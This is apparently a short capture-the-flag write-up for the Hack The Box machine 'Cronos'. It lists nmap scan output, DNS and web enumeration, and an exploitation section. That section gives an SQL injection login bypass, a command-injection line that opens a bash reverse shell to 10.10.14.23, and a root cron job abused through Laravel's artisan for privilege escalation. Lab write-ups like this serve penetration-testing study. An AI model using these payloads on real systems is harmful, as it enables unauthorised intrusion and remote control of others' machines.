# Cronos

### Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### DNS Enum

```
cronos.htb             604800  IN      A       10.10.10.13
admin.cronos.htb       604800  IN      A       10.10.10.13
ns1.cronos.htb         604800  IN      A       10.10.10.13
www.cronos.htb         604800  IN      A       10.10.10.13
```

### Web Enum

```
http://cronos.htb/
	/css
	/js
	

http://www.cronos.htb/
	/robots.txt
	/web.config

http://ns1.cronos.htb/

http://admin.cronos.htb/ -> login page -> SQLi ' or 1=1; #
	/config.php
	/session.php
	/welcome.php
```

### Exploitation & Priv Esc

```bash
# bypass http://admin.cronos.htb/ login with SQLi
' or 1=1; #

# get shell by command injection
127.0.0.1; bash -c "bash -i >& /dev/tcp/10.10.14.23/443 0>&1"

root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

# inject artisan and done
```
